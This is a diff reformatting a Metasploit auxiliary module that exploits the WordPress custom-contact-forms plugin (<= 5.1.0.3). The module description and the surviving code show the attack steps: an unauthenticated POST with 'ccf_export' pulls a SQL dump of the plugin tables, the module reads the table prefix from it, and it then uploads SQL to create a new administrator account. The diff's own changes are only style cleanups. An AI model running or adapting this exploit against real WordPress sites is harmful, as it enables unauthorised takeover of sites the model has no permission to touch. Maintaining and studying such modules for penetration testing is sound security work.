@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,27 +10,26 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'WordPress custom-contact-forms Plugin SQL Upload',
-      'Description'    => %q{
-          The WordPress custom-contact-forms plugin <= 5.1.0.3 allows unauthenticated users to download
-          a SQL dump of the plugins database tables. It's also possible to upload files containing
-          SQL statements which will be executed. The module first tries to extract the WordPress
-          table prefix from the dump and then attempts to create a new admin user.
-      },
-      'Author' =>
-        [
-          'Marc-Alexandre Montpas', # Vulnerability discovery
-          'Christian Mehlmauer' # Metasploit module
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'URL', 'http://blog.sucuri.net/2014/08/database-takeover-in-custom-contact-forms.html' ],
-          [ 'URL', 'https://plugins.trac.wordpress.org/changeset?old_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.3&old=997569&new_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.4&new=997569&sfp_email=&sfph_mail=' ],
-          [ 'WPVDB', '7542' ]
-        ],
-      'DisclosureDate' => 'Aug 07 2014'
-      ))
+                      'Name'           => 'WordPress custom-contact-forms Plugin SQL Upload',
+                      'Description'    => %q(
+                          The WordPress custom-contact-forms plugin <= 5.1.0.3 allows unauthenticated users to download
+                          a SQL dump of the plugins database tables. It's also possible to upload files containing
+                          SQL statements which will be executed. The module first tries to extract the WordPress
+                          table prefix from the dump and then attempts to create a new admin user.
+                      ),
+                      'Author' =>
+                        [
+                          'Marc-Alexandre Montpas', # Vulnerability discovery
+                          'Christian Mehlmauer' # Metasploit module
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'URL', 'http://blog.sucuri.net/2014/08/database-takeover-in-custom-contact-forms.html' ],
+                          [ 'URL', 'https://plugins.trac.wordpress.org/changeset?old_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.3&old=997569&new_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.4&new=997569&sfp_email=&sfph_mail=' ],
+                          [ 'WPVDB', '7542' ]
+                        ],
+                      'DisclosureDate' => 'Aug 07 2014'))
   end
 
   def get_sql(table_prefix, username, password)
@@ -42,13 +42,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_table_prefix
-    res = send_request_cgi({
-      'uri'       => wordpress_url_admin_post,
-      'method'    => 'POST',
-      'vars_post' => {
-        'ccf_export' => "1"
-      }
-    })
+    res = send_request_cgi('uri' => wordpress_url_admin_post,
+                           'method'    => 'POST',
+                           'vars_post' => {
+                             'ccf_export' => "1"
+                           })
     return nil if res.nil? || res.code != 302 || res.headers['Location'] !~ /\.sql$/
 
     file = res.headers['Location']
@@ -138,5 +136,4 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
   end
-
 end
